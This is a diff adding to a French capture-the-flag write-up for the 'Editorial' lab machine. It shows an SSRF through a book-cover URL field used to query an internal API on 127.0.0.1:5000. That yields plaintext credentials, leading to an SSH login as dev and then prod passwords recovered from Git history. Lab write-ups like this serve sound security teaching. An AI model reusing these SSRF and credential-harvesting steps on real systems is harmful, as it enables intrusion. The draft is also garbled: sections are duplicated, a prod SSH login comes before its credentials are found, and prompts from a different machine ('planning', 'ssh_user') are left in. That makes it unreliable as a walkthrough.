@@ -422,15 +422,415 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+## Prise pied
+
+L’énumération web a montré que la page `/upload/` permet de proposer un livre à la plateforme Editorial.
+
+![Page upload de Editorial avec le champ Cover URL permettant de fournir une URL distante pour la couverture du livre](upload-page.png)
+
+La page contient plusieurs champs classiques : nom du livre, description, raison du choix de l’éditeur, email et téléphone de contact.
+
+Mais le point le plus intéressant se trouve en haut du formulaire : l’application permet de fournir une **URL de couverture** dans le champ `Cover URL related to your book or...`.
+
+Ce fonctionnement mérite d’être testé attentivement.
+
+En effet, lorsqu’une application accepte une URL fournie par l’utilisateur, puis tente elle-même de récupérer la ressource distante, il faut envisager une vulnérabilité de type **SSRF**.
+
+> Une SSRF permet de forcer le serveur web à effectuer une requête HTTP à ta place, parfois vers des services internes normalement inaccessibles depuis l’extérieur.
+
+Ici, l’objectif est donc de vérifier si le serveur Editorial va réellement contacter l’URL que tu fournis dans le champ de couverture.
+
+### Test du chargement d’une image distante
+
+Pour commencer, tu peux vérifier le comportement normal attendu.
+
+Depuis ton Kali, tu prépares une image de test dans un répertoire accessible, puis tu l’exposes avec un petit serveur HTTP :
+
+```bash
+python3 -m http.server 8000
+```
+
+Ensuite, dans le champ `Cover URL`, tu indiques une URL pointant vers ton Kali :
+
+```url
+http://10.10.1x.x:8000/test.jpg
+```
+
+Tu cliques ensuite sur le bouton **Preview**.
+
+Si l’application tente de récupérer l’image, ton serveur HTTP sur Kali reçoit une requête. Cela confirme que ce n’est pas ton navigateur qui va directement chercher l’image, mais bien le serveur web distant.
+
+Une fois l’aperçu généré, tu peux cliquer sur l’image affichée puis choisir **Open Image in New Tab** dans le navigateur.
+
+Cette étape est pratique pour deux raisons :
+
+- elle permet de confirmer que l’image a bien été récupérée par l’application ;
+- elle permet de sauvegarder localement le fichier généré ou renvoyé par le serveur sur ton Kali pour l’analyser plus facilement.
+
+À ce stade, le comportement observé est compatible avec une SSRF : l’application accepte une URL externe, la traite côté serveur, puis renvoie le résultat dans la page.
+
+### Recherche de services internes
+
+Maintenant que le comportement SSRF est confirmé, tu peux détourner le mécanisme de prévisualisation de couverture pour interroger des services accessibles depuis la machine cible elle-même.
+
+L’idée est simple : au lieu de demander au serveur Editorial d’aller chercher une image sur ton Kali, tu lui demandes d’aller interroger une adresse locale comme `127.0.0.1`.
+
+Depuis l’extérieur, Nmap ne montre que les ports exposés publiquement. Mais une application web peut aussi communiquer avec des services internes, uniquement accessibles en local depuis la machine.
+
+Tu peux donc tester des URLs de ce type dans le champ `Cover URL` :
+
+```url
+http://127.0.0.1/
+http://127.0.0.1:5000/
+http://127.0.0.1:8000/
+http://localhost:5000/
+http://localhost:8000/
+```
+
+Tu commences par le port `5000`, car il est très souvent utilisé par des applications web internes, notamment des applications Python avec Flask ou Werkzeug.
+
+Dans le contexte d’une application web, c’est donc un excellent premier candidat à tester lorsqu’une SSRF permet d’interroger `127.0.0.1`.
+
+Dans le champ `Cover URL`, tu indiques par exemple :
+
+```url
+http://127.0.0.1:5000/
+```
+
+Puis tu cliques sur **Preview**.
+
+Si le serveur interne répond, l’application Editorial récupère la réponse à ta place et l’affiche sous forme de prévisualisation. Tu peux ensuite cliquer sur l’image ou le résultat affiché, puis choisir **Open Image in New Tab** pour ouvrir directement la ressource générée dans un nouvel onglet.
+
+Cette méthode permet de mieux observer la réponse renvoyée par le service interne, et éventuellement de sauvegarder le résultat sur ton Kali pour l’analyser plus confortablement.
+
+Le test sur `127.0.0.1:5000` renvoie justement une réponse intéressante : au lieu d’une simple image, tu obtiens une réponse JSON contenant des informations sur une API interne.
+
+Ce résultat confirme deux choses importantes :
+
+- un service web interne écoute bien sur le port `5000` ;
+- ce service n’est pas directement exposé depuis l’extérieur, mais il devient accessible grâce à la SSRF.
+
+À ce stade, la SSRF devient réellement exploitable. Elle ne sert plus seulement à prouver que le serveur peut charger une URL distante : elle permet maintenant de cartographier une surface d’attaque interne normalement invisible.
+
+### Recherche de services internes
+
+Maintenant que le comportement SSRF est confirmé, tu peux détourner le mécanisme de prévisualisation de couverture pour interroger des services accessibles depuis la machine cible elle-même.
+
+L’idée est simple : au lieu de demander au serveur Editorial d’aller chercher une image sur ton Kali, tu lui demandes d’aller interroger une adresse locale comme `127.0.0.1`.
+
+Depuis l’extérieur, Nmap ne montre que les ports exposés publiquement. Mais une application web peut aussi communiquer avec des services internes, uniquement accessibles en local depuis la machine.
+
+Tu peux donc tester des URLs de ce type dans le champ `Cover URL` :
+
+```url
+http://127.0.0.1/
+http://127.0.0.1:5000/
+http://127.0.0.1:8000/
+http://localhost:5000/
+http://localhost:8000/
+```
+
+Tu commences par le port `5000`, car il est très souvent utilisé par des applications web internes, notamment des applications Python avec Flask ou Werkzeug.
+
+Dans le contexte d’une application web, c’est donc un excellent premier candidat à tester lorsqu’une SSRF permet d’interroger `127.0.0.1`.
+
+Dans le champ `Cover URL`, tu indiques par exemple :
+
+```url
+http://127.0.0.1:5000/
+```
+
+Puis tu cliques sur **Preview**.
+
+Si le serveur interne répond, l’application Editorial récupère la réponse à ta place et l’affiche sous forme de prévisualisation. Tu peux ensuite cliquer sur le résultat affiché, puis choisir **Open Image in New Tab** pour ouvrir directement la ressource générée dans un nouvel onglet.
+
+Cette méthode permet de mieux observer la réponse renvoyée par le service interne, et éventuellement de sauvegarder le résultat sur ton Kali pour l’analyser plus confortablement.
+
+Dans ce cas, le test sur `127.0.0.1:5000` renvoie une réponse JSON :
+
+```json
+{
+  "messages": [
+    {
+      "promotions": {
+        "description": "Retrieve a list of all the promotions in our library.",
+        "endpoint": "/api/latest/metadata/messages/promos",
+        "methods": "GET"
+      }
+    },
+    {
+      "coupons": {
+        "description": "Retrieve the list of coupons to use in our library.",
+        "endpoint": "/api/latest/metadata/messages/coupons",
+        "methods": "GET"
+      }
+    },
+    {
+      "new_authors": {
+        "description": "Retrieve the welcome message sended to our new authors.",
+        "endpoint": "/api/latest/metadata/messages/authors",
+        "methods": "GET"
+      }
+    },
+    {
+      "platform_use": {
+        "description": "Retrieve examples of how to use the platform.",
+        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+        "methods": "GET"
+      }
+    }
+  ],
+  "version": [
+    {
+      "changelog": {
+        "description": "Retrieve a list of all the versions and updates of the api.",
+        "endpoint": "/api/latest/metadata/changelog",
+        "methods": "GET"
+      }
+    },
+    {
+      "latest": {
+        "description": "Retrieve the last version of api.",
+        "endpoint": "/api/latest/metadata",
+        "methods": "GET"
+      }
+    }
+  ]
+}
+```
+
+Ce résultat confirme deux choses importantes :
+
+- un service web interne écoute bien sur le port `5000` ;
+- ce service expose une API interne qui n’est pas directement accessible depuis l’extérieur.
+
+La SSRF devient donc réellement exploitable. Elle ne sert plus seulement à prouver que le serveur peut charger une URL distante : elle permet maintenant de cartographier une surface d’attaque interne normalement invisible.
+
+### Découverte de l’API interne
+
+La réponse obtenue sur `127.0.0.1:5000` ressemble à une documentation minimale de l’API.
+
+Elle ne donne pas encore directement un secret ou un identifiant, mais elle fournit plusieurs routes internes à tester avec la même méthode SSRF.
+
+Les endpoints les plus intéressants sont :
+
+```text
+/api/latest/metadata/messages/promos
+/api/latest/metadata/messages/coupons
+/api/latest/metadata/messages/authors
+/api/latest/metadata/messages/how_to_use_platform
+/api/latest/metadata/changelog
+/api/latest/metadata
+```
+
+À partir de là, tu peux reprendre exactement le même principe : placer une URL interne complète dans le champ `Cover URL`, cliquer sur **Preview**, puis ouvrir le résultat dans un nouvel onglet.
+
+Par exemple :
+
+```url
+http://127.0.0.1:5000/api/latest/metadata/messages/authors
+```
+
+ou encore :
+
+```url
+http://127.0.0.1:5000/api/latest/metadata/changelog
+```
+
+L’objectif est d’identifier une route qui révèle plus d’informations que prévu : message interne, fichier de configuration, note de développement, identifiant oublié ou indication sur une autre ressource à explorer.
+
+Dans ce type de scénario, il faut lire chaque endpoint comme une petite pièce du puzzle. Les routes `promos` ou `coupons` peuvent sembler peu sensibles, mais les routes liées aux auteurs, à l’utilisation de la plateforme ou au changelog sont souvent plus intéressantes, car elles peuvent contenir des informations de développement ou des messages internes.
+
+### Récupération d’identifiants via l’endpoint authors
+
+Parmi les endpoints découverts, la route liée aux nouveaux auteurs mérite une attention particulière :
+
+```url
+http://127.0.0.1:5000/api/latest/metadata/messages/authors
+```
+
+Tu la testes donc avec la même méthode que précédemment : tu places cette URL dans le champ `Cover URL`, tu cliques sur **Preview**, puis tu ouvres le résultat dans un nouvel onglet avec **Open Image in New Tab**.
+
+Cette fois, la réponse obtenue est beaucoup plus sensible :
+
+```json
+{
+  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
+}
+```
+
+La réponse contient un modèle de message de bienvenue destiné aux nouveaux auteurs. Le problème est que ce modèle inclut des identifiants en clair :
+
+```text
+Username: dev
+Password: dev080217_devAPI!@
+```
+
+Cette information confirme que l’API interne ne devrait pas être accessible depuis l’extérieur. Elle contient des données prévues pour un usage interne, mais la SSRF permet de les récupérer indirectement.
+
+À ce stade, la vulnérabilité SSRF a donc permis de passer de :
+
+```text
+champ URL public
+→ requête serveur vers 127.0.0.1
+→ API interne sur le port 5000
+→ endpoint authors
+→ identifiants dev
+```
+
+Ces identifiants doivent maintenant être testés sur les services accessibles depuis l’extérieur, en particulier SSH puisque le port 22 est ouvert.
+
+### Connexion SSH avec l’utilisateur dev
+
+Les identifiants récupérés via l’API interne peuvent maintenant être testés sur les services exposés par la machine.
+
+Comme le port SSH est ouvert, tu tentes une connexion avec l’utilisateur `dev` :
+
+```bash
+ssh dev@editorial.htb
+```
+
+Avec le mot de passe récupéré dans l’endpoint `authors`, la connexion réussit :
+
+```bash
+dev@editorial.htb's password:
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-107-generic x86_64)
+```
+
+Tu obtiens alors un premier accès utilisateur sur la machine :
+
+```bash
+dev@editorial:~$ id
+uid=1001(dev) gid=1001(dev) groups=1001(dev)
+```
+
+La prise pied est donc obtenue.  
+La SSRF a permis d’accéder à une API interne, puis de récupérer des identifiants SSH valides pour l’utilisateur `dev`.
+
+
+
+### user.txt
+
+Une fois connecté, tu commences par observer le contenu du répertoire personnel de `dev` :
+
+```bash
+dev@editorial:~$ ls -la
+```
+
+```bash
+drwxr-x--- 4 dev  dev  4096 May 27 16:20 .
+drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
+drwxrwxr-x 3 dev  dev  4096 Jun  5  2024 apps
+lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
+drwx------ 2 dev  dev  4096 Jun  5  2024 .cache
+-rw------- 1 dev  dev    20 May 27 16:20 .lesshst
+-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
+-rw-r----- 1 root dev    33 May 27 09:40 user.txt
+```
+
+Depuis la session SSH obtenue avec l’utilisateur `dev`, tu peux lire le flag utilisateur :
+
+```bash
+dev@editorial:~$ cat user.txt
+94aexxxxxxxxxxxxxxxxxxxxxxxxb415
+```
+
+La prise pied est donc validée : la SSRF a permis d’accéder à une API interne, de récupérer les identifiants de `dev`, puis d’obtenir une session SSH sur la machine.
+
+
+
+
+
+### Connexion SSH
+
+Les identifiants récupérés dans l’historique Git permettent ensuite de tenter une connexion SSH.
+
+```
+ssh prod@editorial.htb
+```
+
+Puis tu saisis le mot de passe découvert dans l’ancien commit :
+
+```text
+080217_Producti0n_2023!@
+```
+
+Tu disposes maintenant d’un premier accès utilisateur sur la cible.
+
+```
+prod@editorial:~$ id
+uid=1000(prod) gid=1000(prod) groups=1000(prod)
+```
+
+### user.txt
+
+Une fois connecté avec l’utilisateur `prod`, tu peux récupérer le flag utilisateur :
+
+```
+cat user.txt
+```
+
+Tu as maintenant terminé la prise pied : la vulnérabilité SSRF a permis d’accéder à une API locale, puis à des informations de développement sensibles, jusqu’à l’obtention d’un accès SSH valide sur la machine.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### SSRF explication
+
+Une **SSRF** est une faille où l’application accepte une URL fournie par l’utilisateur, puis demande au **serveur** d’aller la visiter à sa place.
+
+Dans un usage normal, cela peut servir à récupérer une image distante, par exemple une couverture de livre :
+
+```
+Utilisateur → donne une URL d’image
+Serveur → va chercher l’image
+Serveur → l’affiche ou la sauvegarde
+```
+
+Le problème apparaît quand l’application ne contrôle pas assez l’URL fournie. Au lieu de donner une vraie image externe, un attaquant peut donner une adresse interne comme :
+
+```
+http://127.0.0.1:5000/
+```
+
+Depuis ton navigateur, cette adresse ne donnerait rien d’utile, car `127.0.0.1` désigne ta propre machine. Mais si c’est le **serveur cible** qui visite cette URL, alors `127.0.0.1` désigne **le serveur lui-même**.
+
+C’est là que la faille devient intéressante :
+
+```
+attaquant → application web → service interne du serveur
+```
+
+En pratique, une SSRF peut permettre de découvrir une API locale, un service d’administration, une page de debug, ou des informations internes qui ne sont pas accessibles directement depuis Internet.
+
+Phrase utilisable dans ton writeup :
+
+> Une SSRF permet de détourner une fonctionnalité qui récupère une URL distante afin de faire interroger par le serveur ses propres services internes, normalement inaccessibles depuis l’extérieur.
+
+
+
+
+
+
 
 ---
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
+{{< escalade-intro user="dev" >}}
 
 ### Observation avec pspy64
 
@@ -465,41 +865,194 @@ Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences
 
 ```
 ssh_user@planning:~$ sudo -l
-[sudo] password for ssh_user: 
-Sorry, user ssh_user may not run sudo on planning.
+[sudo] password for dev: 
+Sorry, user dev may not run sudo on planning.
 ```
 
-L’utilisateur `ssh_user` ne possède donc aucun droit sudo exploitable.
+L’utilisateur `dev` ne possède donc aucun droit sudo exploitable.
 
 ### Exploration du contexte utilisateur
 
-Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
+Une fois le flag utilisateur récupéré, tu ne disposes pas encore de privilèges élevés sur la machine.
 
-```
-whoami
-id
-pwd
-uname -a
-hostname
-```
+L’étape suivante consiste donc à explorer le contexte de l’utilisateur `dev` afin d’identifier des fichiers, dépôts, scripts ou configurations pouvant révéler une piste vers un autre utilisateur ou vers `root`.
 
-Résultat :
+Dans son répertoire personnel, la présence du dossier `apps` attire l’attention. Le nom est cohérent avec le contexte de la machine : tu viens d’exploiter une application web et une API interne. Il est donc logique de vérifier si ce répertoire contient du code applicatif, des fichiers de configuration ou des traces de développement.
 
-```
-ssh_user
-uid=1000(ssh_user) gid=1000(ssh_user) groups=1000(ssh_user)
-/home/ssh_user
-Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
-planning
+### Découverte du dépôt Git
+
+La présence d’un répertoire `apps` attire l’attention :
+
+Le nom `apps` est intéressant dans le contexte de cette machine : tu viens justement d’exploiter une application web et une API interne. Il est donc logique de vérifier si ce répertoire contient du code applicatif, des fichiers de configuration ou des traces de développement.
+
+Tu entres dans le répertoire :
+
+```bash
+cd apps
 ```
 
-Cette étape permet notamment de confirmer :
+Dans le répertoire `apps`, tu remarques la présence d’un dépôt Git :
 
-- l’utilisateur courant
-- les groupes associés
-- le noyau Linux utilisé
-- le nom de la machine
-- le répertoire de travail actuel
+```bash
+dev@editorial:~/apps$ ls -la
+```
+
+```text
+drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
+drwxr-xr-x 4 dev dev 4096 Jun  5  2024 ..
+drwxrwxr-x 8 dev dev 4096 Jun  5  2024 .git
+```
+
+C’est un élément important.
+
+Un répertoire `.git` contient l’historique d’un dépôt Git : commits, branches, messages, anciennes versions de fichiers et parfois des informations supprimées de la version actuelle du projet.
+
+Dans un contexte de CTF, mais aussi dans un audit réel, c’est une piste classique : un mot de passe ou un secret peut avoir été supprimé du code actuel, tout en restant présent dans un ancien commit.
+
+Pour travailler plus confortablement, tu peux cloner le dépôt sur ton Kali plutôt que de l’analyser directement sur la machine cible.
+
+L’objectif est d’obtenir une copie locale du dépôt afin de pouvoir utiliser tranquillement les commandes Git depuis Kali, sans modifier les fichiers présents dans le répertoire de l’utilisateur `dev`.
+
+### Clonage du dépôt apps sur Kali
+
+Depuis ton Kali, tu peux cloner le dépôt distant en passant par SSH :
+
+```bash
+git clone ssh://dev@editorial.htb/home/dev/apps apps_editorial
+```
+
+Le dernier argument, `apps_editorial`, est simplement le nom du dossier local créé sur Kali.
+
+Ce nom ne vient pas de la machine cible. Il sert uniquement à ranger proprement la copie du dépôt `apps` récupéré depuis Editorial.
+
+Après avoir saisi le mot de passe de l’utilisateur `dev`, Git récupère le dépôt :
+
+```bash
+Cloning into 'apps_editorial'...
+dev@editorial.htb's password:
+remote: Enumerating objects: ...
+remote: Counting objects: ...
+remote: Compressing objects: ...
+Receiving objects: ...
+Resolving deltas: ...
+```
+
+Tu peux ensuite entrer dans la copie locale :
+
+```bash
+cd apps_editorial
+```
+
+À partir de maintenant, l’analyse se fait directement sur Kali.
+
+Tu peux vérifier l’état du dépôt :
+
+```bash
+git status
+```
+
+Puis afficher l’historique des commits :
+
+```bash
+git log --oneline
+```
+
+Cette méthode est plus confortable : tu disposes d’une copie locale complète, tu peux parcourir l’historique, inspecter les commits et rechercher des chaînes intéressantes sans travailler directement sur la cible.
+
+### Analyse de l’historique Git
+
+Depuis la copie locale du dépôt sur Kali, tu affiches l’historique des commits :
+
+```bash
+git log --oneline
+```
+
+```text
+8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
+dfef9f2 change: remove debug and update api port
+b73481b change(api): downgrading prod to dev
+1e84a03 feat: create api to editorial info
+3251ec9 feat: create editorial app
+```
+
+L’historique est court, ce qui facilite l’analyse.
+
+Plusieurs messages de commit attirent l’attention :
+
+- `fix: bugfix in api port endpoint`
+- `change: remove debug and update api port`
+- `change(api): downgrading prod to dev`
+
+Les deux premiers indiquent des modifications autour d’un endpoint et du port de l’API. Cela correspond directement à ce que tu as exploité avec la SSRF sur `127.0.0.1:5000`.
+
+Le commit le plus intéressant est toutefois :
+
+```text
+b73481b change(api): downgrading prod to dev
+```
+
+Le message suggère qu’un changement a été effectué entre un environnement `prod` et un environnement `dev`, ou entre un utilisateur `prod` et un utilisateur `dev`.
+
+Dans un dépôt Git, ce type de modification mérite toujours d’être inspecté, car il peut révéler une ancienne valeur remplacée, par exemple un identifiant, un mot de passe, une URL interne ou une configuration sensible.
+
+### Extraction d’identifiants depuis l’historique Git
+
+Tu inspectes le commit `b73481b`, repéré dans l’historique :
+
+```bash
+git show b73481b
+```
+
+Le commit porte le message suivant :
+
+```text
+change(api): downgrading prod to dev
+
+* To use development environment.
+```
+
+Ce message confirme que le commit remplace une configuration de production par une configuration de développement.
+
+Dans la sortie de `git show`, Git affiche les différences entre l’ancienne version et la nouvelle version du fichier `app_api/app.py`.
+
+La partie importante se trouve dans la fonction liée au message de bienvenue des nouveaux auteurs :
+
+```diff
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
++        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+```
+
+La ligne supprimée, marquée avec `-`, contient les anciens identifiants de production :
+
+```text
+Username: prod
+Password: 080217_Producti0n_2023!@
+```
+
+La ligne ajoutée, marquée avec `+`, correspond aux identifiants de développement que tu avais déjà récupérés via l’API interne :
+
+```text
+Username: dev
+Password: dev080217_devAPI!@
+```
+
+C’est exactement le type d’information que l’on cherche dans un historique Git.
+
+Même si les identifiants `prod` ne sont plus présents dans la version actuelle de l’application, ils restent visibles dans l’ancien commit. Le commit a bien remplacé les identifiants de production par des identifiants de développement, mais il n’a pas effacé l’information sensible de l’historique.
+
+Le commentaire situé à la fin du bloc est également intéressant :
+
+```python
+# TODO: replace dev credentials when checks pass
+```
+
+Il indique que les identifiants de développement étaient censés être temporaires. Cela renforce l’idée que les anciens identifiants `prod` peuvent encore être valides sur la machine.
+
+La prochaine étape consiste donc à tester ces identifiants pour effectuer un mouvement latéral vers l’utilisateur `prod`.
 
 ### Recherche de binaires SUID
 
